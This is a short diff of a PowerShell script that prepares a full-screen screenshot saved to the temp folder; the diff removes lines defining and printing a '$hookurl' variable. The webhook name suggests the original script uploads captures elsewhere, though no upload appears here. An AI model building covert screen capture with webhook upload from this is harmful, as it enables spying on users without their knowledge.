@@ -1,9 +1,7 @@
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
-$hookurl=$hookurl; 
 $Fileto = "$env:temp\SC.png"
-Write-Output $hookurl
 $width = Get-CimInstance Win32_VideoController;  $width = [int]($width).CurrentHorizontalResolution;
 $height = Get-CimInstance Win32_VideoController;  $height= [int]($height).CurrentVerticalResolution; 
 $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
